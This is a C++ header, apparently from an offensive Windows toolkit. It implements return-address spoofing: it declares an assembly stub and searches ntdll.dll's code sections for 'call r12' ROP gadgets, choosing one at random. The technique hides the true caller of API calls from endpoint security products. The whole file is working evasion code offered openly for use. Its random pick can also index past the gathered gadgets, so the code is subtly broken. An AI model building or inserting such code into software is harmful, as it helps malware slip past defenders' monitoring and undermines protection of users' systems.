#pragma once
#include <windows.h>
#include <iostream>
#include "resolvers.h"
#include "functions.h"



#define GEN_RAND(min, max) (rand() % (max + 1 - min) + min)

#define MAX_GADGETS 30

/// <summary>
/// an Assembly function for return address spoofing (variadic function) , Returns void pointer so that the return value can be casted to anything
/// </summary>
/// <param name="Function"></param>
/// <param name="nArgs"></param>
/// <param name="r12_gadget"></param>
/// <param name="argN"></param>
/// <param name=""></param>
extern "C" void* RetSpoofCall(void* Function, unsigned long long nArgs, void* r12_gadget, void* argN, ...);



static BOOL IsValidGadgetx64(PBYTE pbAddress)
{
    return *pbAddress == 0x41 && *(pbAddress + 1) == 0xFF && *(pbAddress + 2) == 0xD4;
}




/// <summary>
/// Finds The Needed ROPGadget (call r12) From ntdll.dll, picks a random location everytime
/// </summary>
/// <returns></returns>
PBYTE FindROPGadget() {


    HMODULE hNtDLL = hNT; 

    if (hNtDLL == NULL)
    {
        std::cout << "Failed to get ntdll.dll\n";
        return NULL;
    }



    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hNtDLL;

    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "[-] Invalid DOS Signature !\n";
        return NULL;
    }


    PIMAGE_NT_HEADERS pnthdr = (PIMAGE_NT_HEADERS)((uintptr_t)hNtDLL + pDosHdr->e_lfanew);

    if (pnthdr->Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "[-] Invalid NT Signature !\n";
        return NULL;
    }


    PIMAGE_SECTION_HEADER psctionhdr = IMAGE_FIRST_SECTION(pnthdr);

    LPVOID lpGadgets[MAX_GADGETS];
    RtlSecureZeroMemory(lpGadgets, sizeof lpGadgets);

    DWORD dwGadgetCount = 0;
    uintptr_t pBase = (uintptr_t)hNtDLL;  

    for (int i = 0; i < pnthdr->FileHeader.NumberOfSections; i++) {

        if ((psctionhdr[i].Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE && (psctionhdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {

            PBYTE pSectionBase = (PBYTE)(pBase + psctionhdr[i].VirtualAddress);
            PBYTE pSectionEnd = (PBYTE)(pSectionBase + psctionhdr[i].Misc.VirtualSize); 

            for (PBYTE CurrentPosition = pSectionBase; CurrentPosition < (pSectionEnd -1 ); CurrentPosition++) {

                if (!IsValidGadgetx64(CurrentPosition)) { continue; }
                
                lpGadgets[dwGadgetCount++] = CurrentPosition;

                if (dwGadgetCount == MAX_GADGETS)
                {
                    break;
                }

            }

        }

    }
    return (PBYTE)lpGadgets[GEN_RAND(0, dwGadgetCount)];
}



